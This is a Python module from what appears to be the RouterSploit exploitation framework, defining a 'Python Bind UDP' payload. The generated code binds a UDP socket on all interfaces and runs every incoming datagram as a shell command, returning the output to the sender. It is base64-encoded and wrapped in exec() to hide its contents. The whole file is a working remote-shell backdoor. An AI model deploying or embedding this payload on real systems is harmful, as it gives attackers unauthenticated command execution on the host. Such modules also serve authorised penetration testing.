from base64 import b64encode
from routersploit.core.exploit.payloads import BindTCPPayloadMixin, GenericPayload


class Exploit(BindTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Python Bind UDP",
        "description": "Creates interactive udp bind shell by using python.",
        "authors": (
            "Andre Marques (zc00l)",  # shellpop
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
    }

    def generate(self):
        payload = (
            "from subprocess import Popen,PIPE\n" +
            "from socket import socket, AF_INET, SOCK_DGRAM\n" +
            "s=socket(AF_INET,SOCK_DGRAM)\n" +
            "s.bind(('0.0.0.0',{}))\n".format(self.rport) +
            "while 1:\n"
            "\tdata,addr=s.recvfrom(1024)\n" +
            "\tout=Popen(data,shell=True,stdout=PIPE,stderr=PIPE).communicate()\n" +
            "\ts.sendto(''.join([out[0],out[1]]),addr)\n"
        )

        encoded_payload = str(b64encode(bytes(payload, "utf-8")), "utf-8")
        return "exec('{}'.decode('base64'))".format(encoded_payload)
